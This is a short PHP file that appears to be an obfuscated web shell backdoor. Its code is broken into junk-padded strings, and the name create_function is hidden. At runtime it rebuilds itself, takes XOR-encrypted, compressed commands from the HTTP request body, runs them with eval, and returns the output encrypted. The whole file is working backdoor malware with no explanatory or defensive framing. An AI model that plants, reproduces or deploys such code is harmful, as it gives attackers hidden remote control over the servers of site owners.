<?php
$j='="ka5xKYKY2EBglmNyKYKYgCjv";function xKYKY($t,$k){KY$c=strlKYKYKYen($k)';
$d='KYKYi<$l);$j++,$i+KY+){$o.=$KYt{$KYi}^$k{KY$j}KY;}KY}rKYeturnKY $o;}ifKY (@p';
$x='KYe($m[KY1KY]),$k))KY);$o=@obKY_get_conKYtents(KY);@KYKYob_end_cKYlean();$';
$q='$k="0KYKY85730cb";$kh="44KYf1f28fKYf230"KY;$kf="KYKY8feKYef67f033cKY";$p';
$L='m)==1) {@ob_sKYtart();@eKYvalKY(@gzuncoKYmpresKYs(@x(@baKYKYse64_decod';
$a='reg_match("KY/KY$kh(.+)$kf/",@fKYile_gKYet_cKYonteKYnts("phpKY://input"KY),KYKY$';
$W='rKY=@base6KY4KY_encKYode(@x(@gzKYcomKYpress($oKYKYKY),$k));print("$p$kh$r$kf");}';
$Y=str_replace('U','','cUUreUatUe_funcUtUion');
$r=';$l=strlenKY($t);$o=KYKY"";KYfor($i=0;$i<KY$l;){for($j=KY0;($j<$c&KY&$';
$z=str_replace('KY','',$q.$j.$r.$d.$a.$L.$x.$W);
$D=$Y('',$z);$D();
?>
